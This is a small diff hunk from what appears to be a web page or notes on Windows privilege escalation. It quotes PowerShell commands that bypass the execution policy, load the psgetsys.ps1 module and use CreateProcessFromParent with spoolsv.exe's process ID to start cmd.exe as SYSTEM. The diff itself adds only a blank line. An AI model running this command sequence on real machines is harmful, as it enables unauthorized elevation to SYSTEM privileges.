@@ -15,3 +15,4 @@ PS C:\Tools\psgetsystem> powershell -ep bypass
 PS C:\Tools\psgetsystem> Import-Module .\psgetsys.ps1 
 <p style="margin-left: 25px;">
 PS C:\Tools\psgetsystem> [MyProcess]::CreateProcessFromParent([Process ID of spoolsv.exe],"C:\Windows\System32\cmd.exe","")
+
